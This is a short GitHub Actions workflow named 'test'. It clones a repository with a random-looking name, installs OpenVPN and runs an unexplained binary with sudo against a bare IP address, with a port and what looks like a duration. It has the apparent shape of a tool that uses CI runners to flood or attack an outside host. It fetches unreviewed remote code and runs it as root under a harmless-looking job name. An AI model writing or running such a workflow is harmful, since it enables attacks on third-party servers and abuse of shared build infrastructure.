name: test

on: [workflow_dispatch]

jobs:
  clone-and-run:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout current repository
      uses: actions/checkout@v4

    - name: Clone target repository
      run: git clone https://github.com/sdasdsaddd33/sdasdafsfsfsfffsa.git ./target-repo

    - name: Install OpenVPN
      run: |
        sudo apt-get update
        sudo apt-get install -y openvpn

    - name: Make main executable
      run: chmod +x ./target-repo/main

    - name: Runs
      run: |
        cd ./target-repo
        sudo ./main http://36.3.104.69/ 5000 1800